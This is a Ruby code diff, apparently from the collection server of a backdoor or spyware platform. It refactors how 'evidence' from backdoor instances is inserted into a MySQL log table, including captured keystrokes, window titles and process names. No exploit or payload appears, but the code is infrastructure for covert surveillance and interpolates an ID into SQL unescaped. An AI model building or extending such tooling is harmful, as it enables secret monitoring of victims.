@@ -6,16 +6,14 @@ module DBLayer
 module Evidence
   
   def evidence_store(evidence)
-    trace :info, "storing evidence #{evidence.info[:type]}"
-    
-    cacheable = 1
+    trace :info, "storing evidence #{evidence.info[:type]} for backdoor #{evidence.info[:instance]}"
     
     case evidence.info[:type]
       when :DEVICE, :INFO
         q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, longtext1)
                  VALUES (0,
                  '#{@mysql.escape(evidence.info[:type].to_s)}',
-                 #{cacheable},
+                 1,
                  #{evidence.info[:backdoor_id]},
                  '#{@mysql.escape(evidence.info[:source_id])}',
                  '#{@mysql.escape(evidence.info[:device_id])}',
@@ -27,7 +25,7 @@ module Evidence
         q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `int1`, `longblob1`)
                  VALUES (0,
                  '#{@mysql.escape(evidence.info[:type].to_s)}',
-                 #{cacheable},
+                 1,
                  #{evidence.info[:backdoor_id]},
                  '#{@mysql.escape(evidence.info[:source_id])}',
                  '#{@mysql.escape(evidence.info[:device_id])}',
@@ -42,7 +40,7 @@ module Evidence
         q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, longtext1)
                  VALUES (0,
                  '#{@mysql.escape(evidence.info[:type].to_s)}',
-                 #{cacheable},
+                 1,
                  #{evidence.info[:backdoor_id]},
                  '#{@mysql.escape(evidence.info[:source_id])}',
                  '#{@mysql.escape(evidence.info[:device_id])}',
@@ -52,7 +50,6 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:process_name])}',
                  '#{@mysql.escape(evidence.info[:window_name])}',
                  '#{@mysql.escape(evidence.info[:keystrokes])}')"
-
       else
         trace :debug, "Not implemented."
         return nil
